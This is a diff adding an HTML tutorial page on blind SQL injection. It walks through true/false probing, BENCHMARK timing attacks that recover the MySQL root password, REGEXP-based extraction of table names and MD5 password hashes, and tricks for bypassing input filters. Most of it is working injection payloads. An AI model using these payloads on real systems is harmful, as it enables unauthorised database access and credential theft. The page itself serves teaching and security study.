@@ -1,0 +1,429 @@
+
+<!DOCTYPE html>
+<!--[if lt IE 7 ]><html class="ie ie6" lang="en"> <![endif]-->
+<!--[if IE 7 ]><html class="ie ie7" lang="en"> <![endif]-->
+<!--[if IE 8 ]><html class="ie ie8" lang="en"> <![endif]-->
+<!--[if (gte IE 9)|!(IE)]><!-->
+<html lang="en">
+<!--<![endif]-->
+<!-- HEAD SECTION -->
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="">
+    <meta name="author" content="">
+
+
+<style>
+
+#h3{
+    border: 20px solid grey;
+    padding: 10px;
+}
+
+
+</style>
+
+</head>
+
+
+<body style=background-color:#00FFFF;>
+
+
+<div id="h3">
+                                                                           
+
+
+
+
+
+
+<center><h1>Blind Sql Injection</h1></center>
+
+
+
+<center><h2>Blind Sql Injection with Regular
+Expressions Attack</h2></center>
+
+
+
+<h2>Why blind sql injection?</h2>
+
+
+<p style="font-size:140%;">
+&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
+&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
+
+
+Blind SQL Injection is used when a web application is vulnerable to an SQL injection, but the
+results of the injection are not visible to the attacker.</p>
+
+
+<p style="font-size:140%;">
+&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
+&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
+
+
+The page with the vulnerability may not be one that displays data but will display differently
+depending on the results of a logical statement injected into the legitimate SQL statement
+called for that page.</p>
+
+
+<p style="font-size:140%;">
+&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
+&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
+
+
+This type of attack can become time-intensive because a new statement must be crafted for
+each bit recovered.</p>
+
+
+
+
+<h2>How blind sql injection can be used?</h2>
+
+
+
+
+<h3>There are several uses for the Blind Sql Injection:</h3>
+
+
+<p style="font-size:140%;">
+
+
+
+
+==>Testing the vulnerability;<br>
+==>Finding the table name;<br>
+==>Exporting a value;<br>
+Every techniques are based on the 'guess attack', because we only have two different input:
+TRUE or FALSE. Let me explain better...</p>
+
+
+
+
+
+
+<h2>Testing vulnerability (MySQL - MSSQL):</h2>
+
+
+<p style="font-size:140%;">
+
+
+
+Let's star with an easy example. We have this type of URL:<br>
+site.com/news.php?id=2</p>
+
+<p style="font-size:140%;">
+
+it will result in this type of query on the database:<br>
+SELECT * FROM news WHERE ID = 2</p>
+
+<p style="font-size:140%;">
+
+
+Now, we can try some sql injection techniques, for example the blind sql injection!<br>
+site.com/news.php?id=2 and 1=0</p>
+
+<p style="font-size:140%;">
+
+
+SQL query is now:<br>
+SELECT * FROM news WHERE ID = 2 and 1=0</p>
+
+
+<p style="font-size:140%;">
+
+
+In this case the query will not return anything (FALSE) because 1 is different from 0; Let's do
+the litmus test: try to get the TRUE statement forcing the AND to be TRUE;<br>
+site.com/news.php?id=2 and 0=0</p>
+
+
+<p style="font-size:140%;">&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
+&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
+
+In this case 0 is equal to 0... Got it! We should now see the original news page. We now know
+that is vulnerable to Blind Sql Injection.</p>
+
+
+
+
+<h2>Time attack (MySQL)</h2>
+
+
+<p style="font-size:140%;">
+&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
+&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
+
+
+
+When you can't see any kind of results, you must use the time attack.
+In this example we will try to obtain the password of root user in mysql (if your have root
+priviledges on mysql).
+BENCHMARK function is used to sleep for some seconds.</p>
+
+
+<p style="font-size:140%;">
+
+
+Syntax: BENCHMARK(how many times,thing to do).
+When you use it in IF statement, you will be able to make time attack in MySQL;<br>
+SELECT 1,1 UNION SELECT<br>
+IF(SUBSTRING(Password,1,1)='a',BENCHMARK(100000,SHA1(1)),0) User,Password
+FROM mysql.user WHERE User = ‘root’;<br>
+
+
+
+
+
+SELECT 1,1 UNION SELECT<br>
+IF(SUBSTRING(Password,1,1)='b',BENCHMARK(100000,SHA1(1)),0) User,Password
+FROM mysql.user WHERE User = ‘root’;<br>
+
+
+
+
+SELECT 1,1 UNION SELECT<br>
+IF(SUBSTRING(Password,1,1)='c',BENCHMARK(100000,SHA1(1)),0) User,Password
+FROM mysql.user WHERE User = ‘root’;<br>
+
+
+
+
+SELECT 1,1 UNION SELECT<br>
+IF(SUBSTRING(Password,1,1)='d',BENCHMARK(100000,SHA1(1)),0) User,Password
+FROM mysql.user WHERE User = ‘root’;<br>
+
+
+
+
+And so on until you will see the BENCHMARK running (few more seconds delay). Now proceed
+with the 2nd word of the password...</p>
+
+
+
+<h2>Regexp attack's methodology</h2>
+
+
+<p style="font-size:140%;">
+&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
+&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
+
+
+
+This is our own creation and it is the faster to extract information from a database. With this
+you can save a lot of time and bandwidth!
+The methodology is pretty simple: we define a range of numbers/chars/spacial chars that will
+be matched with REGEXP (MySQL) or LIKE (MSSQL) functions.
+Let's start with an example because is more simple to understand.</p>
+
+
+
+
+
+<h2>Finding table name with Regexp attack (MySQL)</h2>
+
+
+<p style="font-size:140%;">
+&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
+&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
+
+
+
+
+In this example we will extract the first matched record of information_schema.tables, you
+must know the name of database!<br>
+
+index.php?id=1 and 1=(SELECT 1 FROM information_schema.tables LIMIT 0,1)<br>
+
+
+&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
+&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
+
+
+We tested the blind sql injection attack, and if we see the correct page, everything is ok.<br>
+
+
+index.php?id=1 and 1=(SELECT 1 FROM information_schema.tables WHERE
+TABLE_SCHEMA="blind_sqli" AND table_name REGEXP '^[a-z]' LIMIT 0,1)<br>
+
+
+
+In this case we know that the first matched record start with a char between [a -> z]
+That example will show you how to extract the complete name of the record:<br>
+
+
+index.php?id=1 and 1=(SELECT 1 FROM information_schema.tables WHERE
+TABLE_SCHEMA="blind_sqli" AND table_name REGEXP '^[a-n]' LIMIT 0,1)<br>
+True<br>
+index.php?id=1 and 1=(SELECT 1 FROM information_schema.tables WHERE
+TABLE_SCHEMA="blind_sqli" AND table_name REGEXP '^[a-g]' LIMIT 0,1)<br>
+False<br>
+index.php?id=1 and 1=(SELECT 1 FROM information_schema.tables WHERE
+TABLE_SCHEMA="blind_sqli" AND table_name REGEXP '^[h-n]' LIMIT 0,1)<br>
+True<br>
+index.php?id=1 and 1=(SELECT 1 FROM information_schema.tables WHERE
+TABLE_SCHEMA="blind_sqli" AND table_name REGEXP '^[h-l]' LIMIT 0,1)<br>
+False<br>
+
+index.php?id=1 and 1=(SELECT 1 FROM information_schema.tables WHERE
+TABLE_SCHEMA="blind_sqli" AND table_name REGEXP '^m' LIMIT 0,1)<br>
+False<br>
+index.php?id=1 and 1=(SELECT 1 FROM information_schema.tables WHERE
+TABLE_SCHEMA="blind_sqli" AND table_name REGEXP '^n' LIMIT 0,1)
+True<br>
+The first letter of the table is 'n'. But are there other tables start with 'n'? Let's change the
+limit to 1,1:<br>
+index.php?id=1 and 1=(SELECT 1 FROM information_schema.tables WHERE
+TABLE_SCHEMA="blind_sqli" AND table_name REGEXP '^n' LIMIT 1,1)<br>
+False<br>
+No, there are no more tables that start with 'n'. From now on we must change the regular
+expression like this: '^n[a-z]' -> '^ne[a-z]' -> '^new[a-z]' -> '^news[a-z]' -> FALSE
+To test if we found the correct table name, we must test something like this: '^news$'.</p>
+
+
+
+
+
+
+
+<h2>Exporting a value with Regexp attack (MySQL)</h2>
+
+<p style="font-size:140%;">
+&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
+&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
+
+
+
+
+
+In this example we will extract a MD5 hash from a know table name (in this case 'users');
+Remember: MD5 can ONLY contain [a-f0-9] values.
+
+<p style="font-size:140%;">
+
+
+
+We will use the same methodology described in the “Finding table name”.<br>
+index.php?id=1 and 1=(SELECT 1 FROM users WHERE password REGEXP '^[a-f]' AND
+ID=1)<br>
+False<br>
+index.php?id=1 and 1=(SELECT 1 FROM users WHERE password REGEXP '^[0-9]' AND
+ID=1)<br>
+True<br>
+index.php?id=1 and 1=(SELECT 1 FROM users WHERE password REGEXP '^[0-4]' AND
+ID=1)<br>
+False<br>
+index.php?id=1 and 1=(SELECT 1 FROM users WHERE password REGEXP '^[5-9]' AND
+ID=1)<br>
+True<br>
+index.php?id=1 and 1=(SELECT 1 FROM users WHERE password REGEXP '^[5-7]' AND
+ID=1)<br>
+True<br>
+index.php?id=1 and 1=(SELECT 1 FROM users WHERE password REGEXP '^5' AND
+ID=1)<br>
+True<br></p>
+
+
+
+
+<h2>Time considerations:</h2>
+
+<p style="font-size:140%;">
+&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
+&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
+
+Take for example the MD5 case. We must export an hash of 32 chars using a blind sql
+injection.<br>
+You know that there are only 16 chars to be tested (1234567890abcdef);<br>
+In an optimistic case, regexp and normal blind need 32 query to be done;<br>
+In a worst-case , regexp need 128 query and normal blind need 512 query;</p>
+
+
+<center>
+<img src="Capture2.png" alt="output" style="width:1000px;height:500px;">
+</center>
+
+
+
+<p style="font-size:140%;">
+&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
+&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
+
+
+
+Let's take now a password case. We must export a 15 chars password mixalpha-numericspecial14.
+You know that there are 76 chars to be tested
+(abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-
+_+=);
+In an optimistic case, regexp and normal blind need 15 query to be done;
+In a worst-case, regexp need approx 94 query and normal blind need 1140 query;
+
+
+
+
+<center>
+<img src="Capture3.png" alt="output" style="width:1000px;height:500px;">
+</center>
+
+
+
+<h2>Bypassing filters</h2>
+
+
+
+<h3>Below are examples of common filters bypass.</h3>
+
+
+<p style="font-size:140%;">
+
+
+TRIM (NO SPACES ALLOWED):<br>
+SELECT/*not important*/1/*really...*/FROM/*im serious*/users ? (open and
+close a comment);<br>
+SELECT(1)FROM(information_schema.tables) ? (parentheses's rules)
+Special chars like:<br>
+0c = form feed, new page<br>
+09 = horizontal tab<br>
+0d = carriage return<br>
+0a = line feed, new line<br>
+Example:<br>
+SELECT%09TABLE_NAME%09FROM%0dinformation_schema.tables<br>
+SPECIAL CHAR (NO ', “ ALLOWED):<br>
+Usually the ' AND “ are used to input some kind of string. So you can input the HEX
+value:<br>
+SELECT passwd FROM users WHERE username=0x61646d696e
+Where 0x61646d696e is the hex value of 'admin'<br>
+Or also using the CHAR function:<br>
+SELECT passwd FROM users WHERE
+username=CONCAT(CHAR(97),CHAR(100),CHAR(109),CHAR(105),CHAR(110))</p>
+
+
+
+
+<h2>Conclusions:</h2>
+
+<p style="font-size:140%;">
+&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
+&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
+
+
+
+To conclude our paper, we must specify that:<br>
+1. Is possible make a “combo” attack using “Time Attack” or other;<br>
+2. The regexp that you will use, could also be a list of chars like “[abcdef0123456789]”;<br>
+3. Our English is fu**ing bad! :)</p>
+
+
+
+
+</body>
+</html>
+
+
+
+
+
+
+
